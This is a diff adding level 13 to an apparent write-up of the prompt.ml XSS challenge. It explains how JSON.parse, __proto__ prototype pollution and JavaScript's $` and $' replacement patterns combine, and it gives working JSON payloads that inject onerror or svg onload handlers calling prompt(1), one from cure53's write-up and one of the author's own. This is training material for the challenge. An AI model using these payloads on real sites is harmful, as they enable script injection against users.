@@ -471,3 +471,47 @@ eval((867982141).toString(32))(1)
 
 <br>
 
+## 13 
+**Explain**
+<img width="1000" src="https://user-images.githubusercontent.com/68285613/149083586-97f4f4f2-4a98-4b8e-a4c8-a889865b5391.png">
+
+- JSON.parse(input)
+
+Have to use JSON.input() to perform prompt(1).
+
+I was not able to solve this one, so I read cure53's writeup.
+
+Gotta say '$ is really something.
+
+- $`   | Inserts the portion of the string that follows the matched substring 
+
+The solution in cure53 is
+
+```JSON
+{"source":{},"__proto__":{"source":"$`onerror=prompt(1)>"}}
+```
+
+Thus I think perhaps there's other solutions, hence 
+
+```JSON
+{"source":"*", "__proto__":{"source":"$'<svg/onload=prompt(1)>"}}
+```
+
+<br>
+
+**Readings**
+- [Introducing JSON](https://www.json.org/json-en.html)
+- [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)
+- [cure53 writeup](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-13)
+<br>
+
+**Solve**
+```JSON
+{"source":"*", "__proto__":{"source":"$'<svg/onload=prompt(1)>"}}
+```
+
+<img width="1000" src="https://user-images.githubusercontent.com/68285613/149163895-47346159-3061-4a06-9680-b242a43aee11.png">
+
+<br>
+
+<br>
